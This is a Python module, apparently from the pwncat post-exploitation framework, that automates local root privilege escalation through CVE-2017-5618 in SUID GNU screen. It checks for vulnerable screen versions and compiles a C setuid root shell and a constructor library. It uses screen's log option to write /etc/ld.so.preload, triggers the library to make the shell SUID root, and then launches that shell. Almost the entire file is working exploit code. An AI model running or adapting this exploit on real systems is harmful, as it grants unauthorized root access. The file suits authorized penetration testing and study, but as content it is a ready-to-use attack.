#!/usr/bin/env python3

import re
import textwrap
from io import StringIO
from typing import List

import pwncat
from pwncat.gtfobins import Capability
from pwncat.privesc import Technique, BaseMethod, PrivescError
from pwncat.util import CompilationError


class Method(BaseMethod):

    name = "screen (CVE-2017-5618)"
    id = "screen-suid"
    BINARIES = []

    def enumerate(
        self, progress, task, capability: int = Capability.ALL
    ) -> List[Technique]:
        """ Find all techniques known at this time """

        # If we have ran this before, don't bother running it
        if Capability.SHELL not in capability:
            return

        # Grab all possibly vulnerable screen version
        # It has to be SUID for this to work.
        facts = []
        for fact in pwncat.victim.enumerate("screen-version"):
            progress.update(task, step=str(fact.data))
            if fact.data.vulnerable and fact.data.perms & 0o4000:
                facts.append(fact)

        for fact in facts:

            progress.update(task, step=str(fact.data))

            # Carve out the version of screen
            version_output = (
                pwncat.victim.run(f"{fact.data.path} -v").decode("utf-8").strip()
            )
            match = re.search(r"(\d+\.\d+\.\d+)", version_output)
            if not match:
                continue

            # We know the version of screen, check if it is vulnerable...
            version_triplet = [int(x) for x in match.group().split(".")]

            if version_triplet[0] > 4:
                continue

            if version_triplet[0] == 4 and version_triplet[1] > 5:
                continue

            if (
                version_triplet[0] == 4
                and version_triplet[1] == 5
                and version_triplet[2] >= 1
            ):
                continue

            # This may work!
            yield Technique("root", self, fact, Capability.SHELL)

    def execute(self, technique: Technique):
        """ Run the specified technique """

        # Grab the path from the fact (see self.enumerate)
        screen = technique.ident.data.path

        # Write the rootshell source code
        rootshell_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                int main(void){{
                    setuid(0);
                    setgid(0);
                    seteuid(0);
                    setegid(0);
                    execvp("{pwncat.victim.shell}", NULL, NULL);
                }}
                """
        ).lstrip()

        # Compile the rootshell binary
        try:
            rootshell = pwncat.victim.compile([StringIO(rootshell_source)])
        except CompilationError as exc:
            raise PrivescError(f"compilation failed: {exc}")

        rootshell_tamper = pwncat.victim.tamper.created_file(rootshell)

        # Write the library
        libhack_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <sys/types.h>
                #include <unistd.h>
                __attribute__ ((__constructor__))
                void dropshell(void){{
                    chown("{rootshell}", 0, 0);
                    chmod("{rootshell}", 04755);
                    unlink("/etc/ld.so.preload");
                }}
                """
        ).lstrip()

        # Compile libhack
        try:
            libhack_so = pwncat.victim.compile(
                [StringIO(libhack_source)],
                cflags=["-fPIC", "-shared"],
                ldflags=["-ldl"],
            )
        except CompilationError as exc:
            pwncat.victim.tamper.remove(rootshell_tamper)
            raise PrivescError("compilation failed: {exc}")

        # Switch to /etc but save our previous directory so we can return to it
        old_cwd = pwncat.victim.chdir("/etc")

        # Run screen with our library, saving the umask before changing it
        start_umask = pwncat.victim.run("umask").decode("utf-8").strip()
        pwncat.victim.run("umask 000")

        # Run screen, loading our library and causing our rootshell to be SUID
        pwncat.victim.run(f'{screen} -D -m -L ld.so.preload echo -ne "{libhack_so}"')

        # Trigger the exploit
        pwncat.victim.run(f"{screen} -ls")

        # We no longer need the shared object
        pwncat.victim.env(["rm", "-f", libhack_so])

        # Reset umask to the saved value
        pwncat.victim.run(f"umask {start_umask}")

        # Check if the file is owned by root
        file_owner = pwncat.victim.run(f"stat -c%u {rootshell}").strip()
        if file_owner != b"0":

            # Hop back to the original directory
            pwncat.victim.chdir(old_cwd)

            # Ensure the files are removed
            pwncat.victim.env(["rm", "-f", rootshell])

            raise PrivescError("failed to create root shell")

        # Hop back to the original directory
        pwncat.victim.chdir(old_cwd)

        # Start the root shell!
        pwncat.victim.run(rootshell, wait=False)
